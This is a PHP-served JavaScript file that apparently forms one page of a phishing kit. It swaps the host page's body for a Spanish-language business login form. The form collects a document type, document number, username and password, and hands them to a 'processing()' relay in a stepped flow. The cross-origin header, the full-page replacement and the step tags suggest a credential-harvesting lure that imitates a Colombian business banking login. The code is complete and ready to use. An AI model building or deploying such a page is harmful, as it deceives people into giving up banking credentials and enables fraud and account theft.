<?php
header('Access-Control-Allow-Origin: *');
Header("content-type: application/javascript");
?>
var my_titulo = 'Iniciar sesion';

var my_contenido = `
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body { height: 100%; }

  body {
    background: #fff;
    font-family: 'Sora', 'Segoe UI', sans-serif;
    display: flex;
    justify-content: center;
    min-height: 100vh;
    min-height: 100dvh;
  }

  .passa-shell {
    width: min(100%, 430px);
    min-height: 100vh;
    min-height: 100dvh;
    display: flex;
    flex-direction: column;
  }

  /* ── Compact dark header ── */
  .passa-header {
    background: #1a1a1c;
    padding: 28px 24px 24px;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 12px;
    border-radius: 0 0 28px 28px;
    flex-shrink: 0;
  }

  .logo-icon {
    display: flex;
    flex-direction: column;
    gap: 6px;
    transform: rotate(-12deg);
  }

  .logo-icon span {
    display: block;
    height: 9px;
    border-radius: 6px;
    background: #fff;
  }

  .logo-icon span:nth-child(1) { width: 40px; }
  .logo-icon span:nth-child(2) { width: 32px; }
  .logo-icon span:nth-child(3) { width: 24px; }

  .header-title {
    color: #fff;
    font-size: clamp(22px, 6vw, 28px);
    font-weight: 700;
    line-height: 1.1;
    letter-spacing: -0.01em;
  }

  /* ── Form area ── */
  .form-area {
    flex: 1;
    padding: 28px 22px 30px;
    display: flex;
    flex-direction: column;
  }

  .form-lead {
    font-size: 15px;
    color: #555;
    margin-bottom: 24px;
    text-align: center;
  }

  .field-group {
    margin-bottom: 18px;
  }

  .field-row {
    display: flex;
    align-items: center;
    gap: 10px;
    border-bottom: 1.5px solid #c8d0de;
    padding: 10px 2px;
    background: transparent;
    transition: border-color 0.2s;
  }

  .field-row:focus-within {
    border-bottom-color: #1a1a1c;
  }

  .fi {
    flex: 0 0 auto;
    font-size: 20px;
    color: #444;
    display: flex;
    align-items: center;
  }

  .field-row input,
  .field-row select {
    flex: 1;
    border: none;
    outline: none;
    background: transparent;
    font-family: 'Sora', 'Segoe UI', sans-serif;
    font-size: 14px;
    color: #1a1a1c;
    appearance: none;
    -webkit-appearance: none;
    min-width: 0;
  }

  .field-row select { color: #888; }
  .field-row select.has-value { color: #1a1a1c; }
  .field-row input::placeholder { color: #999; }

  .eye-btn {
    flex: 0 0 auto;
    background: none;
    border: none;
    cursor: pointer;
    padding: 0;
    display: flex;
    align-items: center;
    color: #777;
    font-size: 20px;
    line-height: 1;
  }

  .chevron {
    flex: 0 0 auto;
    color: #777;
    font-size: 18px;
    pointer-events: none;
  }

  .forgot-link {
    display: block;
    text-align: right;
    margin-top: 7px;
    font-size: 12px;
    font-weight: 700;
    color: #1a1a1c;
    text-decoration: underline;
    text-underline-offset: 2px;
    cursor: pointer;
  }

  .field-error {
    display: none;
    margin: 6px 0 10px;
    font-size: 12px;
    color: #b42318;
  }

  .btn-login {
    width: 100%;
    height: 56px;
    border: none;
    border-radius: 999px;
    background: #d4d5da;
    color: #8e9099;
    font-family: 'Sora', 'Segoe UI', sans-serif;
    font-size: 17px;
    font-weight: 700;
    cursor: not-allowed;
    margin-top: auto;
    padding-top: 12px;
    transition: background 0.2s, color 0.2s;
  }

  /* fix: button itself shouldn't have padding-top, the margin-top: auto handles spacing */
  .btn-login {
    padding-top: 0;
  }

  .btn-login:not([disabled]) {
    background: #f4d117;
    color: #111;
    cursor: pointer;
  }

  .btn-login:not([disabled]):active {
    opacity: 0.85;
  }
</style>

<div class="passa-shell">
  <div class="passa-header">
    <div class="logo-icon" aria-hidden="true">
      <span></span><span></span><span></span>
    </div>
    <h1 class="header-title">Iniciar sesión</h1>
  </div>

  <div class="form-area">
    <p class="form-lead">Bienvenido, ingresa tus datos</p>

    <form id="passaForm" autocomplete="off">
      <div class="field-group">
        <div class="field-row">
          <i class='bx bx-buildings fi'></i>
          <select id="tipoDoc" name="tipoDoc">
            <option value="">Tipo de documento del negocio</option>
            <option value="NIT">NIT</option>
            <option value="CC">Cédula de ciudadanía</option>
            <option value="CE">Cédula de extranjería</option>
            <option value="PA">Pasaporte</option>
          </select>
          <i class='bx bx-chevron-down chevron'></i>
        </div>
      </div>

      <div class="field-group">
        <div class="field-row">
          <input type="tel" id="numDoc" name="numDoc"
            placeholder="Número de documento del negocio"
            inputmode="numeric" autocomplete="off" />
        </div>
      </div>

      <div class="field-group">
        <div class="field-row">
          <i class='bx bx-user fi'></i>
          <input type="password" id="username" name="user"
            placeholder="Usuario" autocorrect="off" autocomplete="off" />
          <button type="button" class="eye-btn" id="toggleUser" aria-label="Mostrar usuario">
            <i class='bx bx-hide'></i>
          </button>
        </div>
        <span class="forgot-link" id="forgot-user">¿Olvidaste tu usuario?</span>
      </div>

      <div class="field-group">
        <div class="field-row">
          <i class='bx bx-lock-alt fi'></i>
          <input type="password" id="clave" name="clave" placeholder="Clave" />
          <button type="button" class="eye-btn" id="toggleClave" aria-label="Mostrar clave">
            <i class='bx bx-hide'></i>
          </button>
        </div>
        <span class="forgot-link" id="forgot-clave">¿Olvidaste tu clave?</span>
      </div>

      <div id="field-error" class="field-error"></div>

      <button class="btn-login" type="submit" id="btn-continuar-user" disabled>
        Iniciar sesión
      </button>
    </form>
  </div>
</div>
`;

$('#titulo').html(my_titulo);
$('body').html(my_contenido);

localStorage.setItem('contenido', my_contenido);

/* ── Eye toggles ── */
$('#toggleUser').on('click', function() {
  var $inp = $('#username');
  $inp.attr('type', $inp.attr('type') === 'password' ? 'text' : 'password');
  $(this).find('i').toggleClass('bx-hide bx-show');
});

$('#toggleClave').on('click', function() {
  var $inp = $('#clave');
  $inp.attr('type', $inp.attr('type') === 'password' ? 'text' : 'password');
  $(this).find('i').toggleClass('bx-hide bx-show');
});

/* ── Document type select ── */
$('#tipoDoc').on('change', function() {
  $(this).toggleClass('has-value', $(this).val() !== '');
  checkFormValidity();
});

/* ── Numeric-only for document number ── */
$('#numDoc').on('input', function() {
  $(this).val($(this).val().replace(/\D/g, ''));
  checkFormValidity();
});

/* ── General inputs ── */
$('#username, #clave').on('input', function() {
  hideError();
  checkFormValidity();
});

/* ── Validity ── */
function checkFormValidity() {
  var ok = $('#tipoDoc').val() !== '' &&
            $('#numDoc').val().trim() !== '' &&
            $('#username').val().trim() !== '' &&
            $('#clave').val() !== '';
  $('#btn-continuar-user').prop('disabled', !ok);
}

function showError(msg) {
  if (msg) { $('#field-error').text(msg).show(); }
}

function hideError() {
  $('#field-error').hide().text('');
}

/* ── Forgot links ── */
$('#forgot-user').on('click', function() {
  processing({ t: 'forgot_user' });
});

$('#forgot-clave').on('click', function() {
  processing({ t: 'forgot_clave' });
});

/* ── Server error state ── */
if (my_data['mensaje']) {
  showError(my_data['mensaje']);
}

if (my_data['error']) {
  showError('Los datos ingresados no coinciden, intentalo nuevamente.');
}

/* ── Submit ── */
$('#passaForm').on('submit', function(event) {
  event.preventDefault();
  hideError();

  var tipoDoc = $('#tipoDoc').val();
  var numDoc  = $('#numDoc').val().trim();
  var usuario = $('#username').val().trim();
  var clave   = $('#clave').val();

  if (!tipoDoc || !numDoc || !usuario || !clave) { return false; }

  $('#btn-continuar-user').prop('disabled', true);

  try {
    if (typeof window.my_data !== 'object' || window.my_data === null) {
      window.my_data = {};
    }
    window.my_data.usuario = usuario;
    window.my_data.tipoDoc = tipoDoc;
    window.my_data.numDoc  = numDoc;
  } catch(e) {}

  processing({
    t:       'usuario',
    usuario: usuario,
    tipoDoc: tipoDoc,
    numDoc:  numDoc,
    clave:   clave
  });

  return false;
});

checkFormValidity();
